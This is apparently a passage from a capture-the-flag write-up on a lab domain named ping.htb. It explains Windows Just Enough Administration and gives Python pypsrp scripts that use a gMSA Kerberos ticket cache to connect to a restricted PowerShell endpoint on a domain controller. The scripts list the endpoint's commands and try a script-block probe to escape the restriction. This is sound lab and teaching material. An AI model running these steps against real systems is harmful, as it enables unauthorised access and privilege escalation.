---
description: What is JEA (Just Enough Administration)?
---

# JEA

**JEA (Just Enough Administration)** is a Windows security feature that provides **restricted PowerShell access**.

Instead of giving full administrative rights, JEA allows users to:

* Execute only **specific commands**
* Use a **limited set of functions**
* Operate within a **controlled environment**

This is typically implemented using:

* Custom **.pssc configuration files**
* **Restricted endpoints** (e.g., `ConfigurationName = restricted`)
* **Constrained Language Mode**

💡 **Goal:**

Minimize privileges and reduce the attack surface by granting only the access that is absolutely necessary.

**We see JEA is installed (c.roberts shell via winrm)**

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

We review JEA configuration

{% code overflow="wrap" %}
```bash
cat C:\ProgramData\JEA\JEA.pssc
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2026-05-03 at 2.26.23 in the afternoon.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2026-05-03 at 2.27.13 in the afternoon.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2026-05-03 at 2.27.49 in the afternoon.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```python

import os
from pypsrp.wsman import WSMan
from pypsrp.powershell import RunspacePool, PowerShell

os.environ["KRB5CCNAME"] = "Pong_gMSA$.ccache"
os.environ["KRB5_CONFIG"] = "./krb5_cross.conf"

cmd = "(Get-Command).Name"

wsman = WSMan(
  "dc1.ping.htb",
  port=5985,
  ssl=False,
  path="wsman",
  auth="kerberos",
  encryption="auto",
  no_proxy=True,
  negotiate_service="HTTP",
)

with RunspacePool(wsman, configuration_name="restricted") as pool:
  ps = PowerShell(pool)
  ps.add_script(cmd)
  out = ps.invoke()
  print("[>] ")
  for item in out:
      print(item)
  print("ERRORS:")
  for err in ps.streams.error:
      print(str(err))

```
{% endcode %}

The endpoint returned only eight commands:

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2026-05-03 at 2.28.57 in the afternoon.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```python

import os
from pypsrp.wsman import WSMan
from pypsrp.powershell import RunspacePool, PowerShell

os.environ["KRB5CCNAME"] = "Pong_gMSA$.ccache"
os.environ["KRB5_CONFIG"] = "./krb5_cross.conf"

cmd = r'& { whoami }'

wsman = WSMan(
  "dc1.ping.htb",
  port=5985,
  ssl=False,
  path="wsman",
  auth="kerberos",
  encryption="auto",
  no_proxy=True,
  negotiate_service="HTTP",
)

with RunspacePool(wsman, configuration_name="restricted") as pool:
  ps = PowerShell(pool)
  ps.add_script(cmd)
  out = ps.invoke()
  print("[>] ")
  for item in out:
      print(item)
  print("ERRORS:")
  for err in ps.streams.error:
      print(str(err))

```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-05-03 at 2.29.33 in the afternoon.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2026-05-03 at 2.30.08 in the afternoon.png" alt=""><figcaption></figcaption></figure>
